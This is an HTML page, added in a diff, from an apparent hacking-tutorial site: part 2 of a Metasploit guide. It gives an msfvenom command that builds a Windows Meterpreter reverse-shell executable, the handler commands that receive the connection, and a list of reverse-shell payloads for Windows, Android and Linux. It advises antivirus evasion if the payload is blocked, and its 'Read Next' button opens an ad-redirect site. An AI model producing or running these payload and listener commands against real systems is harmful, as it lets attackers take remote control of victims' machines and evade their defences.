@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Metasploit Tutorial - Payloads & Listeners | HackEr404</title>
+  <link rel="stylesheet" href="mystyles.css">
+  <!-- SEO Meta Tags -->
+  <meta name="title" content="Metasploit Payloads & Listeners - Part 2 | HackEr404">
+  <meta name="description" content="Learn how to generate payloads and set up reverse shell listeners in Metasploit. Complete practical guide with examples.">
+  <meta name="keywords" content="metasploit payloads, reverse shell, metasploit listener, msfvenom, hacking tutorials, hacker404">
+  <meta name="robots" content="index, follow">
+  <meta name="author" content="HackEr404">
+  <meta property="og:title" content="Metasploit Payloads & Listeners Tutorial - Part 2">
+  <meta property="og:description" content="Step-by-step tutorial on generating and using payloads in Metasploit. Learn to set up listeners for reverse shells.">
+  <meta property="og:type" content="website">
+</head>
+<body>
+  <nav>
+    <div class="logo">
+      <img src="../404logo.jpg" alt="HACKER 404 Logo">
+    </div>
+    <div class="menu" id="menu">
+      <a href="../index.html">Home</a>
+      <a href="tools.html">Tools</a>
+      <a href="#">Frontend</a>
+      <a href="/networking/networking1.html">Networking</a>
+      <a href="../about.html">About</a>
+      <a href="mycontact.html">Contact</a>
+    </div>
+    <button class="menu-toggle" id="menu-toggle">&#9776;</button>
+  </nav>
+
+  <div class="search-bar">
+    <input type="text" id="globalSearch" placeholder="Search tools..." onkeyup="searchFromTools()" />
+    <ul id="searchResults"></ul>
+  </div>
+
+  <section class="tutorial-container">
+    <h1>Metasploit Framework - Part 2</h1>
+    <img style="width: 250px; height: auto; border-radius: 8px; margin-right: 10px; text-align:center;" src="/assets/metaconsole.jpg" alt="Tutorial Preview">
+    
+    <h2>Payloads and Listeners</h2>
+    <p>In this part, you'll learn how to generate payloads and set up listeners to gain access to the target machine.</p>
+
+    <h3>Creating Payload with msfvenom</h3>
+    <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe</code></pre>
+    <p>This creates a Windows reverse shell payload.</p>
+
+    <h3>Starting a Listener</h3>
+    <pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run</code></pre>
+    <p>Once the payload is executed on the target, Meterpreter session will open.</p>
+
+    <h3>Verify Payload</h3>
+    <ul>
+      <li>Test on a virtual machine.</li>
+      <li>Use antivirus evasion techniques if blocked.</li>
+    </ul>
+
+    <h3>Screenshot</h3>
+    <img src="images/metasploit_payload.jpg" alt="Payload creation in Metasploit">
+
+    <h3>Common Payloads</h3>
+    <ul>
+      <li>windows/meterpreter/reverse_tcp</li>
+      <li>android/meterpreter/reverse_http</li>
+      <li>linux/x86/meterpreter/reverse_tcp</li>
+    </ul>
+
+    <p>In the next tutorial, we’ll see how to use sessions and interact with compromised machines!</p>
+  </section>
+
+  <section id="next-tutorial">
+    <h2>Next Tutorial</h2>
+    <div class="next-tutorial-card">
+      <img src="images/metasploit_sessions.jpg" alt="Next Tutorial Preview">
+      <div class="next-tutorial-content">
+        <h3>Metasploit Part 3: Sessions & Commands</h3>
+        <p>Learn how to control the session and perform post-exploitation techniques.</p>
+        <button class="next-tut-but" onclick="redirectWithAd()">Read Next →</button>
+      </div>
+    </div>
+  </section>
+
+  <script>
+    function redirectWithAd() {
+      window.open('https://sawutser.top/4/9290786', '_blank');
+      setTimeout(function() {
+        window.location.href = 'metasploit3.html';
+      }, 3000);
+    }
+  </script>
+
+  <section id="instagram">
+    <h2>Follow Me on Instagram</h2>
+    <div class="instagram-feed">
+      <a href="https://instagram.com/hacker404.com_" target="_blank">View My Instagram</a>
+    </div>
+  </section>
+
+  <footer>
+    <p>© 2025 hackEr404 - All rights reserved.</p>
+  </footer>
+
+  <script>
+    const toggleBtn = document.getElementById('menu-toggle');
+    const menu = document.getElementById('menu');
+    toggleBtn.addEventListener('click', () => {
+      menu.classList.toggle('show');
+    });
+
+    let toolPages = [];
+    fetch('/tools/tools.json')
+      .then(response => response.json())
+      .then(data => {
+        toolPages = data;
+      });
+
+    function searchFromTools() {
+      const input = document.getElementById("globalSearch").value.toLowerCase();
+      const resultsContainer = document.getElementById("searchResults");
+      resultsContainer.innerHTML = '';
+
+      const filtered = toolPages.filter(tool => tool.title.toLowerCase().includes(input));
+
+      if (filtered.length === 0) {
+        const message = document.createElement("li");
+        message.textContent = "No results found. Please go to the tools folder manually for more tools.";
+        message.style.color = "red";
+        resultsContainer.appendChild(message);
+        return;
+      }
+
+      filtered.forEach(tool => {
+        const li = document.createElement("li");
+        const link = document.createElement("a");
+        link.href = tool.url;
+        link.textContent = tool.title;
+        li.appendChild(link);
+        resultsContainer.appendChild(li);
+      });
+    }
+  </script>
+</body>
+</html>
